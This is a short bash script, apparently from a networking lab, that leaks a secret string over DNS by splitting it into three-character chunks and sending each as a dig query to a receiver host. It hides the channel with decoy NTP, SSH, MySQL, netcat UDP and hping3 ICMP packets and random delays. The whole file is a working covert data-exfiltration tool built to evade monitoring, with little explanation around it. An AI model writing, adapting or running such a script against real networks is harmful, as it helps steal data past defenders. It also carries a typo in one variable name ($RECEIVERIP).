#!/bin/bash
SECRET="NETWORK_SECRET_LAB"
RECEIVER_IP="192.168.20.20"

echo "[DNS Covert] Starting transmission..."

generate_noise() {
    case $((RANDOM % 5)) in
        0) # NTP request
            echo "Sent NTP query"
            ntpdate -q $RECEIVER_IP > /dev/null 2>&1
            ;;
        1) # SSH connection attempt
            port=$((1024 + RANDOM % 64511))
            echo "Sent SSH to port $port"
            ssh -o ConnectTimeout=1 -p $port user@$RECEIVERIP exit > /dev/null 2>&1
            ;;
        2) # MySQL connection attempt
            echo "Sent MySQL request"
            mysql -h $RECEIVER_IP -P 3306 -e "exit" > /dev/null 2>&1
            ;;
        3) # Random UDP
            echo "Sent random UDP"
            echo "$RANDOM" | nc -u -w 1 $RECEIVER_IP 1234
            ;;
        4) # ICMP timestamp
            echo "Sent ICMP timestamp"
            hping3 --icmptype 13 -c 1 $RECEIVER_IP > /dev/null 2>&1
            ;;
    esac
}

for (( i=0; i<${#SECRET}; i+=3 )); do
    # sending real dns query
    part=${SECRET:$i:3}
    echo "Querying..."
    dig +short @$RECEIVER_IP ${part}.secret.ptit > /dev/null
    
    # make noise
    for (( j=0; j<3; j++ )); do  # 3 noise packets per real packet
        generate_noise
    done
    
    sleep $((RANDOM % 3 + 1))  # random delay seconds
done

echo "DNS covert transmission completed!"
